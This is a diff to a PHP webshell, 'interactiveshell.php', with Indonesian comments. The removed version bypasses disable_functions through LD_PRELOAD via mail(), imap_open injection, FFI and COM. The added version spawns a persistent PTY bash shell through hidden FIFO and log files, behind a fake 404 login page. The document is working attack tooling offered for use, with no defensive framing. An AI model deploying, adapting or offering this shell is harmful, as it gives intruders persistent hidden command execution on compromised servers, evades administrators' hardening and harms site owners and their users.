@@ -1,227 +1,312 @@
 <?php
-/**
- * interactiveshell.php — Multi-bypass command execution, PHP 5.2+ compatible
- * Target: PHP 5.2 - 8.x, Windows/Linux, disable_functions bypass
- * Password default: 0xdeadbeef (ganti di bawah)
+/*
+ * interactiveshell.php — persistent TTY-like webshell (PHP 5.2+)
+ *
+ * Bukan one-shot exec: men-spawn SATU proses `script -qfec "bash --norc -i"`
+ * lewat PTY, berkomunikasi via FIFO + logfile di /dev/shm atau /tmp.
+ * disable_functions tetap ter-bypass karena exec dipakai SEKALI saat spawn;
+ * interaksi selanjutnya murni file I/O (fopen/fwrite/fread) yang tidak
+ * bisa di-disable oleh php.ini.
+ *
+ * cd persist, prompt asli (user@host:path$), Ctrl+C (\x03), Ctrl+D (\x04).
+ * Password default: 0xdeadbeef  (GANTI)
  */
 
 $PASS = '0xdeadbeef';
 
-// ========== DISABLED FUNCTIONS DETECTION ==========
-$disabled_str = ini_get('disable_functions');
-$disabled = array();
-if ($disabled_str) {
-    $tmp = explode(',', $disabled_str);
-    foreach ($tmp as $f) $disabled[] = trim($f);
-}
+/* ---------- disable_functions map ---------- */
+$DIS = array();
+$_d = @ini_get('disable_functions');
+if ($_d) { foreach (explode(',', $_d) as $_f) $DIS[] = trim($_f); }
+function DF($fn) { global $DIS; return function_exists($fn) && !in_array($fn, $DIS); }
 
-$available = array();
-$candidates = array('system','exec','shell_exec','passthru','proc_open','popen','mail','imap_open','putenv','stream_socket_server','fsockopen');
-foreach ($candidates as $fn) {
-    if (function_exists($fn) && !in_array($fn, $disabled)) {
-        $available[] = $fn;
+/* ---------- exec router (spawn-only, once) ---------- */
+function XRUN($cmd) {
+    if (DF('proc_open')) {
+        $p = @proc_open($cmd, array(), $pipes);
+        if (is_resource($p)) { @proc_close($p); return 'proc_open'; }
     }
+    if (DF('exec'))       { @exec($cmd);       return 'exec'; }
+    if (DF('system'))     { @system($cmd);     return 'system'; }
+    if (DF('shell_exec')) { @shell_exec($cmd); return 'shell_exec'; }
+    if (DF('passthru'))   { @passthru($cmd);   return 'passthru'; }
+    if (DF('popen'))      { $h=@popen($cmd,'r'); if($h){@pclose($h); return 'popen';} }
+    return false;
 }
 
-// ========== AUTH ==========
-session_start();
-if (isset($_POST['logout'])) { session_destroy(); header('Location: ?'); exit; }
-if (isset($_POST['pass']) && $_POST['pass'] === $PASS) { $_SESSION['auth'] = true; }
-if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
-    die('<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;margin-top:20%"><h2>Locked</h2><form method="POST"><input type="password" name="pass" placeholder="password" autofocus><input type="submit" value="login"></form></body></html>');
-}
-
-// ========== BYPASS IMPLEMENTATIONS ==========
-
-function _run_proc_open($cmd, &$out, &$err) {
-    $desc = array();
-    $desc[0] = array('pipe','r');
-    $desc[1] = array('pipe','w');
-    $desc[2] = array('pipe','w');
-    $p = @proc_open($cmd, $desc, $pipes);
-    if (!is_resource($p)) return false;
-    fclose($pipes[0]);
-    $out = stream_get_contents($pipes[1]);
-    $err = stream_get_contents($pipes[2]);
-    fclose($pipes[1]);
-    fclose($pipes[2]);
-    proc_close($p);
-    return true;
-}
-
-function _run_mail_bypass($cmd) {
-    $so = '/tmp/.x'.substr(md5(uniqid()),0,8).'.so';
-    $src = "#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) static void init(){system(\"$cmd\");}";
-    @file_put_contents('/tmp/x.c',$src);
-    @exec("gcc -shared -fPIC -o $so /tmp/x.c 2>/dev/null");
-    if (!file_exists($so)) return false;
-    @putenv("LD_PRELOAD=$so");
-    @mail('a@a.a','','');
-    @putenv("LD_PRELOAD=");
-    @unlink($so); @unlink('/tmp/x.c');
-    return true;
-}
-
-function _run_imap_bypass($cmd) {
-    if (!extension_loaded('imap')) return false;
-    $payload = "{".$_SERVER['HTTP_HOST']."/bin/sh -c '$cmd > /tmp/xout 2>&1'}INBOX";
-    @imap_open($payload,'x','x');
-    sleep(1);
-    $r = @file_get_contents('/tmp/xout');
-    @unlink('/tmp/xout');
-    return $r;
-}
-
-function _run_ffi_bypass($cmd) {
-    if (!extension_loaded('ffi')) return false;
-    if (version_compare(PHP_VERSION,'7.4.0','<')) return false;
-    try {
-        $ffi = @FFI::cdef("int system(const char *cmd);","libc.so.6");
-        $ffi->system($cmd);
-        return true;
-    } catch(Exception $e) { return false; }
-}
-
-function _run_com_bypass($cmd) {
-    if (!class_exists('COM')) return false;
-    try {
-        $o = new COM("WScript.shell");
-        $o->Run($cmd,0,false);
-        return true;
-    } catch(Exception $e) { return false; }
-}
-
-// ========== MAIN EXECUTION ==========
-
-$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
-$method = isset($_POST['method']) ? $_POST['method'] : 'auto';
-$out = $err = '';
-$ret = false;
-
-if ($cmd) {
-    if ($method === 'auto') {
-        if (in_array('proc_open',$available)) $method='proc_open';
-        elseif (in_array('popen',$available)) $method='popen';
-        elseif (in_array('system',$available)) $method='system';
-        elseif (in_array('exec',$available)) $method='exec';
-        elseif (in_array('shell_exec',$available)) $method='shell_exec';
-        elseif (in_array('passthru',$available)) $method='passthru';
-        else $method='auto_fail';
+/* ---------- writable dir picker ---------- */
+function pick_dir($sid) {
+    $c = array();
+    if (is_dir('/dev/shm'))            $c[] = '/dev/shm';
+    if (is_dir('/tmp'))                $c[] = '/tmp';
+    $t = @sys_get_temp_dir(); if ($t)  $c[] = $t;
+    $s = @session_save_path(); if ($s) $c[] = $s;
+    $c[] = getcwd();
+    foreach ($c as $d) {
+        $probe = $d . '/.p' . $sid;
+        if (@file_put_contents($probe, 'x') !== false) { @unlink($probe); return $d; }
     }
+    return false;
+}
 
-    // Windows: 2>&1 unsupported in some cmd, keep as-is
-    $cmd2 = $cmd;
-    if (strtoupper(substr(PHP_OS,0,3)) !== 'WIN') {
-        $cmd2 .= ' 2>&1';
-    }
+/* ---------- session & auth ---------- */
+@session_start();
+$SID = substr(md5(session_id()), 0, 10);
 
-    switch($method) {
-        case 'proc_open':
-            $ret = _run_proc_open($cmd,$out,$err);
-            break;
-        case 'popen':
-            $p = @popen($cmd2,'r');
-            if ($p) { while(!feof($p)) $out .= fgets($p); pclose($p); $ret=true; }
-            break;
-        case 'system':
-            ob_start(); @system($cmd2); $out = ob_get_clean(); $ret=true;
-            break;
-        case 'exec':
-            @exec($cmd2,$o); $out = implode("\n",$o); $ret=true;
-            break;
-        case 'shell_exec':
-            $out = @shell_exec($cmd2); $ret=true;
-            break;
-        case 'passthru':
-            ob_start(); @passthru($cmd2); $out = ob_get_clean(); $ret=true;
-            break;
-        case 'ffi':
-            $ret = _run_ffi_bypass($cmd);
-            if($ret) $out="[FFI] command sent";
-            break;
-        case 'com':
-            $ret = _run_com_bypass($cmd);
-            if($ret) $out="[COM] command sent";
-            break;
-        case 'imap':
-            $r = _run_imap_bypass($cmd);
-            if($r!==false) { $out=$r; $ret=true; }
-            else $err="imap bypass failed or extension missing";
-            break;
-        case 'mail':
-            $ret = _run_mail_bypass($cmd);
-            if($ret) $out="[mail] LD_PRELOAD sent, check /tmp or target";
-            break;
-        case 'auto_fail':
-            $err = "No execution functions available. All disabled.";
-            $ret = false;
-            break;
-        default:
-            $err = "Method not implemented or not available";
-            $ret = false;
+if (isset($_GET['logout'])) {
+    @session_destroy();
+    header('Location: ?');
+    exit;
+}
+if (isset($_REQUEST['pass']) && $_REQUEST['pass'] === $PASS) $_SESSION['ok'] = 1;
+if (empty($_SESSION['ok'])) {
+    header('HTTP/1.0 404 Not Found');
+    ?><html><head><title>404 Not Found</title></head><body>
+<h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr>
+<form method="post" style="display:none"><input name="pass"></form>
+</body></html><?php
+    exit;
+}
+
+/* ---------- per-session filemap ---------- */
+$BASE = pick_dir($SID);
+$FIFO = $BASE . '/.f_' . $SID;
+$LOG  = $BASE . '/.l_' . $SID;
+$LCH  = $BASE . '/.c_' . $SID . '.sh';
+
+function sh_clean($d) {
+    // ANSI CSI
+    $d = preg_replace("/\x1b\[[0-9;?]*[ -\/]*[@-~]/", '', $d);
+    // OSC
+    $d = preg_replace("/\x1b\][^\x07\x1b]*(\x07|\x1b\\\\)/", '', $d);
+    // other esc
+    $d = preg_replace("/\x1b[@-Z\\\\-_]/", '', $d);
+    $d = str_replace("\x07", '', $d);
+    // line endings (prompt redraw pakai \r)
+    $d = str_replace("\r\n", "\n", $d);
+    $d = str_replace("\r", "\n", $d);
+    // backspace resolution
+    $g = 0;
+    while (strpos($d, "\x08") !== false && $g++ < 2000) {
+        $d = preg_replace("/[^\x08]?\x08/", '', $d);
     }
+    return $d;
+}
+
+function sh_alive($fifo, $log) {
+    if (DF('exec')) {
+        @exec('fuser ' . escapeshellarg($fifo) . ' 2>/dev/null', $o);
+        if (count($o) && trim(implode('', $o)) !== '') return true;
+    }
+    // fallback: ada proses script/bash dengan nama file kita di cmdline
+    if (DF('exec')) {
+        @exec("ps -eo args 2>/dev/null | grep -F " . escapeshellarg($fifo) . " | grep -v grep", $p);
+        if (count($p)) return true;
+    }
+    // last resort: fifo masih ada & log berubah < 300s
+    return file_exists($fifo) && file_exists($log) && (time() - @filemtime($log) < 300);
+}
+
+function sh_spawn($fifo, $log, $lch) {
+    $py = "python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null";
+    $sh = "#!/bin/sh\nF=\"$1\";L=\"$2\"\nrm -f \"$L\"\nmkfifo \"$F\" 2>/dev/null\n"
+        . "if command -v script >/dev/null 2>&1; then\n"
+        . "  setsid script -qfec 'bash --norc -i' /dev/null < \"$F\" > \"$L\" 2>&1 &\n"
+        . "else\n"
+        . "  setsid sh -c 'tail -f \"$0\" | bash --norc -i > \"$1\" 2>&1' \"$F\" \"$L\" &\n"
+        . "fi\n";
+    @file_put_contents($lch, $sh);
+    @chmod($lch, 0700);
+    $cmd = 'setsid sh ' . escapeshellarg($lch) . ' ' . escapeshellarg($fifo) . ' ' . escapeshellarg($log) . ' >/dev/null 2>&1 </dev/null &';
+    return XRUN($cmd);
+}
+
+function sh_kill($fifo, $log, $lch) {
+    if (DF('exec')) {
+        @exec('fuser -k ' . escapeshellarg($fifo) . ' ' . escapeshellarg($log) . ' 2>/dev/null');
+        @exec('pkill -f ' . escapeshellarg('.f_' . substr(basename($fifo), -10)) . ' 2>/dev/null');
+    }
+    @unlink($fifo); @unlink($log); @unlink($lch);
+}
+
+/* ---------- AJAX API ---------- */
+if (isset($_REQUEST['a'])) {
+    header('Content-Type: application/json');
+    $a = $_REQUEST['a'];
+    $R = array('ok' => 1);
+
+    if ($a === 'status') {
+        $R['dir']    = $BASE;
+        $R['alive']  = $BASE && sh_alive($FIFO, $LOG);
+        $R['df']     = @ini_get('disable_functions');
+        $R['php']    = PHP_VERSION;
+        $R['user']   = @get_current_user();
+        $R['os']     = PHP_OS;
+    }
+    elseif ($a === 'start') {
+        if (!$BASE) { $R = array('ok' => 0, 'err' => 'no writable dir'); }
+        elseif (!sh_alive($FIFO, $LOG)) {
+            $m = sh_spawn($FIFO, $LOG, $LCH);
+            if (!$m) { $R = array('ok' => 0, 'err' => 'all exec funcs disabled'); }
+            else {
+                usleep(400000);
+                $_SESSION['pos'] = 0;
+                $R['via'] = $m;
+                $R['alive'] = sh_alive($FIFO, $LOG);
+            }
+        } else { $R['alive'] = true; $R['via'] = 'reuse'; }
+    }
+    elseif ($a === 'cmd') {
+        $c = isset($_REQUEST['c']) ? $_REQUEST['c'] : '';
+        $seq = isset($_SESSION['seq']) ? $_SESSION['seq'] + 1 : 1;
+        $_SESSION['seq'] = $seq;
+        $mk = '__X' . substr(md5($SID), 0, 6) . '_' . $seq . '__$?';
+        $fh = @fopen($FIFO, 'w');
+        if (!$fh) { $R = array('ok' => 0, 'err' => 'fifo dead'); }
+        else {
+            @fwrite($fh, $c . "\n" . 'echo ' . $mk . "\n");
+            @fclose($fh);
+        }
+    }
+    elseif ($a === 'sig') {
+        $k = isset($_REQUEST['k']) ? $_REQUEST['k'] : '';
+        $ch = ($k === 'int') ? "\x03" : (($k === 'eof') ? "\x04" : (($k === 'susp') ? "\x1a" : ''));
+        if ($ch !== '') {
+            $fh = @fopen($FIFO, 'w');
+            if ($fh) { @fwrite($fh, $ch); @fclose($fh); }
+        }
+    }
+    elseif ($a === 'poll') {
+        $pos = isset($_SESSION['pos']) ? intval($_SESSION['pos']) : 0;
+        $sz = file_exists($LOG) ? @filesize($LOG) : 0;
+        if ($sz === false) $sz = 0;
+        if ($sz < $pos) $pos = 0;               // log rotated/recreated
+        $out = '';
+        if ($sz > $pos) {
+            $fh = @fopen($LOG, 'r');
+            if ($fh) {
+                @fseek($fh, $pos);
+                $out = @fread($fh, min($sz - $pos, 256 * 1024));
+                $pos = @ftell($fh);
+                @fclose($fh);
+            }
+        }
+        $_SESSION['pos'] = $pos;
+        $out = sh_clean($out);
+        // buang echo baris marker-command
+        $out = preg_replace('/^[^\n]*echo __X' . substr(md5($SID), 0, 6) . '_\d+__\$\?[^\n]*\n/m', '', $out);
+        // marker -> badge exit code (sembunyikan kalau 0)
+        $out = preg_replace('/\n?__X' . substr(md5($SID), 0, 6) . '_\d+__(\d{1,3})\n?/', "\n[[E:$1]]\n", $out);
+        $R['alive'] = sh_alive($FIFO, $LOG);
+        if ($out !== '') $R['out'] = $out;
+    }
+    elseif ($a === 'stop') {
+        sh_kill($FIFO, $LOG, $LCH);
+        $_SESSION['pos'] = 0;
+        $R['alive'] = false;
+    }
+    echo json_encode($R);
+    exit;
 }
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-<title>_sh</title>
+<meta charset="utf-8">
+<title>tty</title>
 <style>
-body{background:#0a0a0a;color:#c9d1d9;font-family:monospace;font-size:14px;padding:20px;margin:0}
-h1{color:#58a6ff;font-size:16px;border-bottom:1px solid #30363d;padding-bottom:8px;margin-bottom:16px}
-.meta{color:#8b949e;font-size:12px;margin-bottom:8px}
-.meta span.label{color:#79c0ff;margin-right:8px}
-textarea{width:100%;background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:10px;font-family:monospace;font-size:14px;min-height:50px;resize:vertical}
-select,input,button{background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:8px 12px;font-family:monospace}
-button{background:#238636;color:#fff;cursor:pointer}
-button:hover{background:#2ea043}
-.row{display:flex;gap:10px;margin:10px 0;flex-wrap:wrap}
-.output{background:#161b22;border:1px solid #30363d;padding:15px;min-height:200px;white-space:pre-wrap;word-wrap:break-word;color:#7ee787}
-.error{color:#f85149}
-.logout{float:right}.logout button{background:#f85149;padding:4px 8px;font-size:12px}
+  html,body{height:100%;margin:0;background:#0d1117;color:#c9d1d9;font:13px/1.45 "Consolas","DejaVu Sans Mono",monospace}
+  #bar{background:#161b22;padding:6px 10px;border-bottom:1px solid #30363d;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+  #bar b{color:#58a6ff}
+  .dot{width:9px;height:9px;border-radius:50%;background:#f85149;display:inline-block}
+  .dot.on{background:#3fb950}
+  #bar span{color:#8b949e}
+  button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:3px 10px;font:inherit;cursor:pointer}
+  button:hover{background:#30363d}
+  #scr{position:absolute;top:38px;bottom:34px;left:0;right:0;overflow-y:auto;padding:8px 10px;white-space:pre-wrap;word-break:break-all;cursor:text}
+  #cmd{position:absolute;bottom:0;left:0;right:0;background:#161b22;border:0;border-top:1px solid #30363d;color:#c9d1d9;padding:8px 10px;font:inherit;outline:none}
+  .ec{color:#f85149}
+  a{color:#58a6ff;font-size:11px}
 </style>
 </head>
 <body>
-<div class="logout"><form method="POST"><input type="hidden" name="logout" value="1"><button>logout</button></form></div>
-<h1>interactiveshell</h1>
-
-<div class="meta"><span class="label">user:</span><span><?php echo htmlspecialchars(get_current_user().' uid='.getmyuid()); ?></span></div>
-<div class="meta"><span class="label">php:</span><span><?php echo PHP_VERSION; ?></span></div>
-<div class="meta"><span class="label">os:</span><span><?php echo PHP_OS; ?></span></div>
-<div class="meta"><span class="label">disabled:</span><span><?php echo count($disabled)?htmlspecialchars(implode(', ',$disabled)):'none'; ?></span></div>
-<div class="meta"><span class="label">available:</span><span><?php echo count($available)?htmlspecialchars(implode(', ',$available)):'none'; ?></span></div>
-
-<form method="POST">
-<textarea name="cmd" placeholder="id && uname -a && whoami"><?php echo htmlspecialchars($cmd); ?></textarea>
-<div class="row">
-<select name="method">
-<option value="auto">auto</option>
-<option value="proc_open">proc_open</option>
-<option value="popen">popen</option>
-<option value="system">system</option>
-<option value="exec">exec</option>
-<option value="shell_exec">shell_exec</option>
-<option value="passthru">passthru</option>
-<option value="ffi">ffi</option>
-<option value="com">com</option>
-<option value="imap">imap bypass</option>
-<option value="mail">mail bypass</option>
-</select>
-<button type="submit">run</button>
+<div id="bar">
+  <span class="dot" id="dot"></span><b>tty-shell</b>
+  <span id="meta">…</span>
+  <button onclick="send('')">Enter</button>
+  <button onclick="sig('int')">^C</button>
+  <button onclick="sig('eof')">^D</button>
+  <button onclick="sig('susp')">^Z</button>
+  <button onclick="clr()">clear</button>
+  <button onclick="restart()">restart</button>
+  <button onclick="stop()">kill</button>
+  <a href="?logout=1">logout</a>
 </div>
-</form>
+<div id="scr" onclick="document.getElementById('cmd').focus()"></div>
+<input id="cmd" autocomplete="off" spellcheck="false" autofocus>
 
-<h1 style="margin-top:20px">output</h1>
-<div class="output<?php echo $err?' error':''; ?>"><?php
-if($err) echo htmlspecialchars($err)."\n";
-if($out) echo htmlspecialchars($out)."\n";
-if($ret===true && !$out && !$err) echo "[exit 0, no output]\n";
-if($ret===false && !$err) echo "[execution failed]\n";
-?></div>
+<script>
+var scr=document.getElementById('scr'), cmd=document.getElementById('cmd'),
+    dot=document.getElementById('dot'), meta=document.getElementById('meta'),
+    hist=[], hi=0, dead=false, timer=null;
 
-<div class="meta" style="margin-top:20px">
-<span class="label">bypass notes:</span>
-<span>mail=needs gcc+sendmail | imap=needs imap ext+writeable /tmp | ffi=needs PHP7.4+ ffi.enable | com=Windows-only</span>
-</div>
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;')}
+function append(out){
+  // badge exit code dari server: [[E:N]]
+  out=esc(out).replace(/\[\[E:(\d+)\]\]/g,function(m,n){
+    return n==='0'?'':'<span class="ec">[exit '+n+']</span>';
+  });
+  scr.insertAdjacentHTML('beforeend',out);
+  scr.scrollTop=scr.scrollHeight;
+}
+function api(q,cb,body){
+  var x=new XMLHttpRequest();
+  x.open('POST','?a='+q,true);
+  x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+  x.onreadystatechange=function(){
+    if(x.readyState===4){
+      try{cb(JSON.parse(x.responseText))}catch(e){schedule()}
+    }
+  };
+  x.send(body||'');
+}
+function schedule(){timer=setTimeout(poll, dead?1500:400)}
+function poll(){
+  api('poll',function(r){
+    if(r.out)append(r.out);
+    var alive=!!r.alive;
+    if(alive!==!dead){dead=!alive;dot.className='dot'+(alive?' on':'');}
+    schedule();
+  });
+}
+function send(v){
+  if(v===undefined)v=cmd.value;
+  if(v){hist.push(v);hi=hist.length;}
+  cmd.value='';
+  api('cmd',function(r){if(!r.ok)append('[!] '+(r.err||'dead')+'\n');},'c='+encodeURIComponent(v));
+}
+function sig(k){api('sig',function(){},'k='+k);}
+function clr(){scr.innerHTML='';}
+function stop(){api('stop',function(r){append('\n[killed]\n');dead=true;schedule();});}
+function restart(){append('\n[respawning…]\n');api('stop',function(){api('start',function(r){if(!r.ok)append('[!] '+(r.err||'')+'\n');setTimeout(poll,300);});});}
+
+cmd.addEventListener('keydown',function(e){
+  if(e.key==='Enter'){e.preventDefault();send();}
+  else if(e.key==='ArrowUp'){e.preventDefault();if(hi>0)cmd.value=hist[--hi]||'';}
+  else if(e.key==='ArrowDown'){e.preventDefault();if(hi<hist.length)cmd.value=hist[++hi]||'';}
+  else if(e.key==='l'&&e.ctrlKey){e.preventDefault();clr();}
+  else if(e.key==='c'&&e.ctrlKey&&!window.getSelection().toString()){e.preventDefault();sig('int');}
+});
+
+api('status',function(s){
+  meta.textContent=(s.user||'?')+' | php '+s.php+' | '+s.os+' | base '+s.dir+(s.df?' | df: '+s.df:'');
+});
+api('start',function(r){
+  if(!r.ok){append('[spawn failed] '+(r.err||'')+'\n');return;}
+  append('[pty up via '+r.via+'] — bash --norc -i\n');
+  setTimeout(poll,250);
+});
+schedule();
+</script>
 </body>
 </html>
